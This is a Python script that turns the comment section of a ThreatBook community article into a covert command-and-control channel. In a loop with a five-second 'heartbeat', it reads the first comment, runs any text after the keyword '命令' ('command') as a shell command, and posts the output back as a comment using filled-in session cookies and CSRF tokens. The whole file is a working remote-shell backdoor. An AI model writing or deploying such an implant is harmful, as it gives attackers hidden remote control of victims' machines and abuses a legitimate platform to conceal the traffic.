# -*- coding: utf-8 -*-
import requests
import json
import time
from subprocess import Popen, PIPE

def get_weibu_comments(short_message_id):
    base_url = "https://x.threatbook.com/v5/node/user/article/queryComments?shortThreatId="+short_message_id

    try:
        response = requests.get(base_url)
        response.raise_for_status()
        # 直接使用 response.json() 获取对象
        json_object = response.json()
        # 检查是否存在 comments 字段
        if "list" in json_object.get("data", {}):
            comments_list = json_object["data"]["list"]
            # 检查列表是否非空
            if comments_list:
                # 提取第一个 comments 对应的值
                first_comment = comments_list[0]["comments"]
                return first_comment
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")

def send_comment(comment, is_anonymous, target_id, short_message_id, csrf_token, rememberme, xx_csrf):
    url = "https://x.threatbook.com/v5/node/user/article/saveComment"

    headers = {
        "Host": "x.threatbook.com",
        "Cookie": f"csrfToken={csrf_token}; rememberme={rememberme}; xx-csrf={xx_csrf}",
        "Content-Type": "application/json",
        "X-Csrf-Token": csrf_token,
        "Xx-Csrf": xx_csrf,
        "Sec-Ch-Ua-Mobile": "?0",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
    }

    data = {
        "comment": comment,
        "isAnonymous": is_anonymous,
        "targetId": target_id,
        "shortMeaasgeId": short_message_id
    }

    try:
        response = requests.post(url, json=data, headers=headers)
        response.raise_for_status()
        return response.json()

    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")

def runcmd(cmd):

    process = Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE)
    stdout, stderr = process.communicate()
    return stdout.decode('gbk')

def split_string(input_string):
    # 定义关键字
    keyword = "命令"
    # 查找关键字的位置
    keyword_index = input_string.find(keyword)

    if input_string.startswith(keyword):
        # 如果找到关键字，将关键字后的部分赋给新变量
        command_result = input_string[keyword_index + len(keyword):]
        return command_result
    else:
        # 如果未找到关键字，返回空字符串或者其他你认为合适的默认值
        return ""


if __name__ == "__main__":
    while True:
            short_message_id = ""   #填写文章ID
            old = get_weibu_comments(short_message_id)
            new = split_string(old)
            comment = runcmd(str(new))
            is_anonymous = False  
            target_id = 0  
            csrf_token = "" #填写csrf_token
            rememberme = "" #填写rememberme
            xx_csrf = ""    #填写xx_csrf
            result_message = send_comment(comment, is_anonymous, target_id, short_message_id, csrf_token, rememberme, xx_csrf)
            time.sleep(5)   #心跳时间
